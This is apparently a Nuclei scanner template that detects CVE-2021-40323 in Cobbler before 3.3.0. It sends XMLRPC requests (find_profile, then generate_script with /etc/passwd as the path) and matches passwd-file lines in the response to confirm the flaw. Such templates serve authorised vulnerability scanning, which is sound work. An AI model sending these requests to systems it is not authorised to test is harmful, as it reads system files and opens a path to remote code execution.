id: CVE-2021-40323
info:
  name: Cobbler <3.3.0 - Remote Code Execution
  author: c-sh0
  severity: critical
  description: Cobbler before version 3.3.0 is vulnerable to remote code execution
    due to log poisoning via an XMLRPC method.
  reference:
  - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
  - https://github.com/cobbler/cobbler/issues/2795
  - https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40323
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40323
    cwe-id: CWE-94
  tags: cve,cve2021,cobbler,rce
  metadata:
    impact: The vulnerability CVE-2021-40323 in Cobbler before 3.3.0 enables attackers
      to execute remote code via log poisoning through an XMLRPC method.
    recommendation: It is highly recommended to immediately update to Cobbler version
      3.3.0 or higher to prevent log poisoning vulnerability and remote code execution
      through XMLRPC method (CVE-2021-40323).
requests:
- raw:
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>find_profile</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n\
    \            <name>name</name>\n            <value>\n              <string>*</string>\n\
    \            </value>\n          </member>\n        </struct>\n      </value>\n\
    \    </param>\n  </params>\n</methodCall>\n"
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>generate_script</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>{{profile}}</string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string></string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string>/etc/passwd</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>\n"
  extractors:
  - type: regex
    name: profile
    internal: true
    group: 1
    regex:
    - <value><string>(.*?)</string></value>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - text/xml
  - type: regex
    regex:
    - root:.*:0
    - bin:.*:1
    - nobody:.*:99
    condition: or
